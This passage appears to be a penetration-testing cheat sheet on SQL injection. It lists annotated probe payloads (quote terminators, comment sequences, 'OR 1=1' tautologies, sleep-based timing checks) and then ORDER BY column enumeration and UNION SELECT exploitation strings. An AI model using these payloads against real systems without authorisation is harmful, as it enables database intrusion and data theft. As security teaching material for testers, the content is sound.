## SQL Injection

### Manual verification
```bash
'                       # a single quote, treated as a string terminator
;                       # a semi-colon, treated as a query terminator
#                       # a comment, comments out anything that comes after that character in that line
-- -                    # a comment, same as above
/**/                    # a comment, starts with /* , ends with */ , and can contain anything in between 
AND 1=1                 # an and statement, 1=1 tests for true condition. Use 1=2 to test for false conditions
OR 1=1                  # an or statement, 1=1 tests for true condition, use 1=2 to test for false condition
sleep(5)                # delays the response by the number of seconds mentioned in the sleep command. 

We should combine the terminators and comment characters above.

'                       # a single quote only to see any error, because of string termination  
';                      # a single quote and semi-colon to see any error, because of query termination
';-- -                  # a single quote and semi-colon and comment after the character to see if this succeeds. 
AND 1 = 1               # and statement to see any error or success 
OR 1 = 1                # or statement to see any error or success
' AND 1=1;-- -          # adding and condition to see if this succeeds.  
' OR 1=1; -- -          # adding or condition to see if this succeeds. 
1 and sleep(5)          # adding and operator, sleep command to look at the time to get the response back
1' and sleep(5);-- -    # adding and operator, sleep command plus string terminator, query terminator, and comment
```

### Exploitation 
```bash
1 order by 1
1 order by 1,2
1 order by 1,2,3
... (Until you see some column error)

' order by 1-- -
' order by 1,2-- -
' order by 1,2,3-- -
...(Until you see some column error)

' order by 1;-- -
' order by 1,2;-- -
' order by 1,2,3;-- -
...(Until you see some column error)

UNION SELECT 1,2-- -
UNION SELECT 1,2;-- -
